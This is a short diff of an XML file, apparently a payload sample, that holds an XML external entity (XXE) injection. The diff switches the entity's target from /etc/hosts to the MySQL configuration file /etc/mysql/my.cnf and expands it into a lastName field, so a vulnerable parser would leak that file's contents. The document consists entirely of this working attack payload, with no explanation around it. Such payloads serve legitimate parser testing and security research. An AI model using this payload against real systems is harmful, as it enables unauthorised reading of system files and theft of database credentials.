@@ -1,5 +1,5 @@
 <!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY ent SYSTEM "file://etc/hosts"> ]>
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file://etc/mysql/my.cnf"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&ent;</lastName>
